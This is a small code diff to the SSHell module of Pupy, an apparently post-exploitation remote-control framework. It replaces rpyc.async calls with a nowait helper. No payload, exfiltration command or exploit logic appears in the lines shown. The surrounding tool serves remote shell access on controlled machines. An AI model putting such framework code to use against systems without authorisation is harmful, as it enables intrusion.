@@ -1,13 +1,13 @@
 # -*- coding: utf-8 -*-
 
 import sys
-import rpyc
 
 from urlparse import urlparse
 from argparse import REMAINDER
 
 from os import path, environ, walk
 
+from network.lib.rpc import nowait
 from pupylib.PupyCompleter import path_completer
 from pupylib.PupyModule import (
     config, PupyModule, PupyArgumentParser,
@@ -117,9 +117,9 @@ class SSHell(PupyModule):
 
         self.client.conn.register_remote_cleanup(closer)
 
-        remote_write = rpyc.async(writer)
+        remote_write = nowait(writer)
 
-        self.iogroup.set_on_winch(rpyc.async(resizer))
+        self.iogroup.set_on_winch(nowait(resizer))
         self.iogroup.set_mapping('~~~.', local_close)
 
         with self.iogroup:
